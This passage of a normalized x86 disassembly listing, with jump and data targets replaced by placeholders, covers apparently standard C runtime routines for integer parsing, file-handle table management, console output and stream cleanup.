je r-xdata
cmp [ ebp - 0x860 ] edi
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x864 ]
cmp [ ebp - 0x864 ] 0x2
jge r-xdata
mov edi eax
jmp r-xdata
cmp [ ebp - 0x870 ] 0x0
je r-xdata
xor edi edi
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor edi edi
jmp r-xdata
inc edi
cmp [ ebp - 0x880 ] 0x0
mov [ ebp - 0x884 ] edi
jl r-xdata
mov eax [ ebp - 0x880 ]
mov eax [ ebp - 0x874 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x864 ] 0x1
jne r-xdata
xor esi esi
cmp [ ebp - 0x8ac ] esi
je r-xdata
lea eax [ ebx - 0x20 ]
cmp al 0x58
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
cmp [ ebp - 0x860 ] 0x1
jne r-xdata
cmp [ ebp - 0x8ac ] 0x7
jne r-xdata
xor edx edx
xor eax eax
movsx eax bl
movzx eax [ eax + r--data ]
and eax 0xf
xor edx edx
jmp r-xdata
cmp [ ebp - 0x864 ] esi
jne r-xdata
cmp eax 0x8
je r-xdata
cmp [ edi ] 0x25
je r-xdata
mov ecx [ ebp - 0x8ac ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
xor esi esi
shr eax 0x4
inc esi
mov [ ebp - 0x8ac ] eax
cmp eax esi
jne r-xdata
cmp [ ebp - 0x894 ] esi
jl r-xdata
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8ac ]
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x860 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x854 ]
lea eax [ ebp - 0x648 ]
mov edi [ ebp - 0x884 ]
mov al [ edi ]
mov [ ebp - 0x85c ] al
test al al
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x860 ] esi
jne r-xdata
push 0xa
lea eax [ ebp - 0x898 ]
push eax
push edi
call sub_43cf77
add esp 0xc
test eax eax
jle r-xdata
mov [ eax ] edx
add edx 0x4
dec ecx
je r-xdata
mov bl [ ebp - 0x85c ]
push 0xa
lea eax [ ebp - 0x898 ]
push eax
push edi
call sub_43cf77
mov ecx [ ebp - 0x898 ]
add esp 0xc
dec eax
cmp [ ebp - 0x864 ] 0x0
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x86c ] eax
mov [ ebp - 0x884 ] edx
jne r-xdata
and [ ebp - 0x860 ] 0x0
xor edx edx
mov eax [ ebp - 0x898 ]
cmp [ eax ] 0x24
jne r-xdata
mov ecx [ eax - 0x4 ]
dec ecx
je r-xdata
dec ecx
je r-xdata
mov edi edx
xor edx edx
test eax eax
js r-xdata
cmp [ ebp - 0x864 ] 0x0
jne r-xdata
dec ecx
je r-xdata
cmp [ ecx ] 0x24
jne r-xdata
mov [ ebp - 0x860 ] esi
jmp r-xdata
push 0x640
lea eax [ ebp - 0x64c ]
push 0x0
push eax
call sub_4338e0
add esp 0xc
mov [ eax ] edx
add edx 0x8
jmp r-xdata
dec ecx
je r-xdata
cmp eax 0x64
jge r-xdata
inc esi
add eax 0x10
mov [ ebp - 0x854 ] edx
cmp esi [ ebp - 0x894 ]
jle r-xdata
dec ecx
je r-xdata
cmp eax [ ebp - 0x894 ]
jle r-xdata
dec ecx
dec ecx
jne r-xdata
mov [ ebp - 0x894 ] eax
sub_43c465
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_4422b9
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_44232d
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_44232d
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_4268f3
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_44232d
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_43c68f
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_4424cd
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_43c6d1
push 0xc
push r--data
call sub_4278c0
push 0x3
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_43c68f
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c70e
mov ax [ ebp - 0x1c ]
call sub_427905
retn
sub_43c720
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_43c74b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_43c7cc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_43c852
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_42970c
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_43c8bb
push 0xc
push r--data
call sub_4278c0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_427905
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c951
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_43c95a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_43c981
push 0x18
push r--data
call sub_4278c0
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_42b0a4
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43cb11
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_427905
retn
push 0x40
push 0x20
call sub_42acf2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_43c8bb
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_42b166
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_43ca53
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_43cb1a
push 0xc
push r--data
call sub_4278c0
xor edi edi
mov [ ebp - 0x1c ] edi
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
cmp eax edi
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_426919
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_43c981
mov esi eax
mov [ ebp + 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
push esi
call sub_43c74b
pop ecx
pop ecx
or bl 0x1
mov eax esi
sar eax 0x5
lea ecx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov edx [ ecx ]
mov [ edx + eax + 0x4 ] bl
mov edx [ ecx ]
lea edx [ edx + eax + 0x24 ]
and [ edx ] 0x80
mov ecx [ ecx ]
lea eax [ ecx + eax + 0x24 ]
and [ eax ] 0x7f
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43cc08
cmp [ ebp - 0x1c ] edi
je r-xdata
call sub_4268f3
mov [ eax ] 0x18
call sub_426906
mov [ eax ] edi
jmp r-xdata
or eax 0xffffffff
mov eax esi
jmp r-xdata
call sub_427905
retn
sub_43cc08
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_43c95a
pop ecx
retn
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_43cc30
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_429a97
push esi
mov edi eax
call sub_4373aa
push esi
call sub_437094
push eax
call sub_44259f
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_42578a
and [ esi + 0x1c ] 0x0
pop ecx
sub_43cc9d
push 0xc
push r--data
call sub_4278c0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
push esi
call sub_429f60
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_43cc30
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43cd09
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_427905
retn
mov eax [ ebp - 0x1c ]
sub_43cd4c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_42b774
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_43d336
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_4268f3
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_43cf77
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_43cd4c
add esp 0x14
pop ebp
retn
sub_43cfbf
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rw-data
jmp r-xdata
call sub_43cd4c
add esp 0x14
pop ebp
retn
sub_43d008
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
call sub_42b774
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ecx ] eax
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x30 ] bl
je r-xdata
mov cl [ eax ]
push esi
mov esi [ ebp - 0x3c ]
push edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
lea edi [ eax + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebp - 0x1 ]
mov ecx [ esi + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x3c ]
push eax
movzx eax [ ebp - 0x1 ]
push 0x8
push eax
call sub_43d336
mov esi [ ebp - 0x3c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x1 ] 0x2d
mov [ ebp - 0x8 ] edi
jne r-xdata
mov al [ edi ]
mov [ ebp - 0x1 ] al
inc edi
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jle r-xdata
push 0x10
pop ecx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp - 0x1 ] 0x30
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
mov edi eax
push edi
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x28 ] edx
call sub_437480
mov [ ebp - 0x20 ] ebx
mov ebx [ esi + 0xc8 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x1 ] 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and eax 0x103
je r-xdata
movsx esi cl
sub esi 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] ecx
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec [ ebp - 0x8 ]
test al 0x8
jne r-xdata
lea eax [ ecx - 0x61 ]
cmp al 0x19
movsx eax cl
ja r-xdata
cmp esi [ ebp + 0x14 ]
jae r-xdata
mov al [ edi + 0x1 ]
add edi 0x2
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ eax - 0x37 ]
sub eax 0x20
mov ecx [ ebp - 0x10 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0x18 ]
jb r-xdata
call sub_4268f3
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp - 0x14 ]
push [ ebp - 0x28 ]
push edi
call sub_442670
xor ecx ecx
add eax esi
adc edx ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
ja r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x14 ] 0xffffffff
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
mov cl [ ebp - 0x1 ]
movzx eax cl
movzx eax [ ebx + eax * 2 ]
mov edx eax
and edx 0x4
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x1c ]
jb r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x10 ] esi
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] ebx
ja r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] esi
jb r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x14 ] 0x0
ja r-xdata
ja r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jbe r-xdata
cmp esi [ ebp - 0x24 ]
jbe r-xdata
sub_43d2a5
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_43d008
add esp 0x14
pop ebp
retn
sub_43d2ed
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rw-data
